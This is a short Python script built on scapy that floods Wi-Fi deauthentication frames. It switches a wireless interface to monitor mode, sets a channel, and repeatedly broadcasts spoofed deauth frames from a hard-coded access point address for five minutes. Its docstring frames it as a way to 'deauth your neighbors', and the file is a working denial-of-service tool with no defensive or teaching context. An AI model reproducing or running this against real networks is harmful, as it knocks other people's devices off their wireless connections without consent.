# HOW TO MAKE AND SEND DEAUTH FRAMES


# IMPORTS
from scapy.all import sendp, RadioTap
from scapy.layers.dot11 import Dot11, Dot11Deauth
import random, time, os



class Deauth_YOU():
    """How to Deauth your neighbors"""


    @staticmethod
    def _frame_creation():
        """Target info"""


        # REASON FOR BEING KICKED OFF
        reasons = random.choice([4,5,7,15])

        # TARGET INFO
        mac_target = "72:66:08:ad:ec:b0"
        mac_broadcast = "ff:ff:ff:ff:ff:ff"


        # LAYER 2 PDU // FRAME
        frame = RadioTap() / Dot11(addr1=mac_broadcast, addr2=mac_target, addr3=mac_target) / Dot11Deauth(reason=reasons)
        return frame


    @staticmethod
    def attack():
        """Launch attacker"""

        # YOUR INFO
        iface = "wlan1"
        mode = "monitor"
        limit = 5 * 60
        channel = 4
        verbose = 0

        # CHANGE IFACE CHANNEL
        os.system(f"sudo ip link set {iface} down; sudo iw dev {iface} set type {mode}; sudo ip link set {iface} up")
        os.system(f"sudo iw dev {iface} set channel {str(channel)}"); print(f"[+] Channel set to: {channel}")
        print(f'[+] Launching Attack....')

         
        # NOW TO SEND THE FRAME
        while limit > 1:
            frame = Deauth_YOU._frame_creation()
            sendp(frame, iface=iface,count=10, verbose=0);  print("[+] Sent 10 frames")
            time.sleep(1); limit -= 1



if __name__ == "__main__":
    Deauth_YOU.attack()